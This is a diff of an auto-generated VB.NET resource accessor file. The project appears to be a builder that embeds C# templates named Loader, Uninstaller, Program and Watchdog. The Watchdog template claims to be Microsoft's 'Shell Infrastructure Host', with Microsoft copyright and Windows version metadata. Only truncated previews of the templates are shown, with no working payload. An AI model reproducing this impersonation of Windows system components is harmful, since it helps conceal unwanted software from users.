@@ -63,10 +63,47 @@ Namespace My.Resources
         '''<summary>
         '''  Looks up a localized resource of type System.Byte[].
         '''</summary>
+        Friend ReadOnly Property administrator() As Byte()
+            Get
+                Dim obj As Object = ResourceManager.GetObject("administrator", resourceCulture)
+                Return CType(obj,Byte())
+            End Get
+        End Property
+        
+        '''<summary>
+        '''  Looks up a localized resource of type System.Byte[].
+        '''</summary>
         Friend ReadOnly Property libs() As Byte()
             Get
                 Dim obj As Object = ResourceManager.GetObject("libs", resourceCulture)
                 Return CType(obj,Byte())
+            End Get
+        End Property
+        
+        '''<summary>
+        '''  Looks up a localized string similar to using System;
+        '''using System.IO;
+        '''using System.Reflection;
+        '''using System.Security.Cryptography;
+        '''using System.Text;
+        '''using System.Resources;
+        '''using System.Threading;
+        '''using System.Diagnostics;
+        '''using System.Runtime.InteropServices;
+        '''#if DefDebug
+        '''using System.Windows.Forms;
+        '''#endif
+        '''
+        '''#if DefAssembly
+        '''[assembly: AssemblyTitle(&quot;%Title%&quot;)]
+        '''[assembly: AssemblyDescription(&quot;%Description%&quot;)]
+        '''[assembly: AssemblyCompany(&quot;%Company%&quot;)]
+        '''[assembly: AssemblyProduct(&quot;%Product%&quot;)]
+        '''[assembly: AssemblyCopyright(&quot;%Copyrig [rest of string was truncated]&quot;;.
+        '''</summary>
+        Friend ReadOnly Property Loader() As String
+            Get
+                Return ResourceManager.GetString("Loader", resourceCulture)
             End Get
         End Property
         
@@ -77,6 +114,16 @@ Namespace My.Resources
             Get
                 Dim obj As Object = ResourceManager.GetObject("Mandark", resourceCulture)
                 Return CType(obj,Byte())
+            End Get
+        End Property
+        
+        '''<summary>
+        '''  Looks up a localized resource of type System.Drawing.Bitmap.
+        '''</summary>
+        Friend ReadOnly Property microsoft_admin() As System.Drawing.Bitmap
+            Get
+                Dim obj As Object = ResourceManager.GetObject("microsoft-admin", resourceCulture)
+                Return CType(obj,System.Drawing.Bitmap)
             End Get
         End Property
         
@@ -109,6 +156,7 @@ Namespace My.Resources
         '''using System.Reflection;
         '''using System.Runtime.InteropServices;
         '''using System.Security.Cryptography;
+        '''using System.Security.Principal;
         '''using System.Text;
         '''using System.Threading;
         '''using Microsoft.Win32;
@@ -119,12 +167,39 @@ Namespace My.Resources
         '''#if DefAssembly
         '''[assembly: AssemblyTitle(&quot;%Title%&quot;)]
         '''[assembly: AssemblyDescription(&quot;%Description%&quot;)]
-        '''[assembly: AssemblyCompany(&quot;%Company%&quot;)]
-        '''[assembly: AssemblyProduc [rest of string was truncated]&quot;;.
+        '''[assembly: AssemblyCompany(&quot;%Comp [rest of string was truncated]&quot;;.
         '''</summary>
         Friend ReadOnly Property Program() As String
             Get
                 Return ResourceManager.GetString("Program", resourceCulture)
+            End Get
+        End Property
+        
+        '''<summary>
+        '''  Looks up a localized string similar to using System;
+        '''using System.IO;
+        '''using System.Reflection;
+        '''using System.Security.Cryptography;
+        '''using System.Text;
+        '''using System.Resources;
+        '''using System.Threading;
+        '''using System.Diagnostics;
+        '''using Microsoft.Win32;
+        '''using System.Linq;
+        '''using System.Collections.Generic;
+        '''using System.Management;
+        '''#if DefDebug
+        '''using System.Windows.Forms;
+        '''#endif
+        '''
+        '''public partial class Uninstaller
+        '''{
+        '''    public static string lb = RGetString(&quot;#LIBSPATH&quot;);
+        '''    public static string bD = Environment.GetFolderPath(Environment. [rest of string was truncated]&quot;;.
+        '''</summary>
+        Friend ReadOnly Property Uninstaller() As String
+            Get
+                Return ResourceManager.GetString("Uninstaller", resourceCulture)
             End Get
         End Property
         
@@ -137,12 +212,14 @@ Namespace My.Resources
         '''using System.Security.Cryptography;
         '''using System.Text;
         '''using System.Threading;
+        '''#if DefDebug
+        '''using System.Windows.Forms;
+        '''#endif
         '''
         '''[assembly: AssemblyTitle(&quot;Shell Infrastructure Host&quot;)]
         '''[assembly: AssemblyDescription(&quot;Shell Infrastructure Host&quot;)]
         '''[assembly: AssemblyProduct(&quot;Microsoft® Windows® Operating System&quot;)]
-        '''[assembly: AssemblyCopyright(&quot;© Microsoft Corporation. All Rights Reserved.&quot;)]
-        '''[assembly: AssemblyFileVersion(&quot;10.0.19041.746&quot;)] [rest of string was truncated]&quot;;.
+        '''[assembly: AssemblyCopyright(&quot;© Microsoft Corporation. All Rights Reserved.&quot;)] [rest of string was truncated]&quot;;.
         '''</summary>
         Friend ReadOnly Property Watchdog() As String
             Get
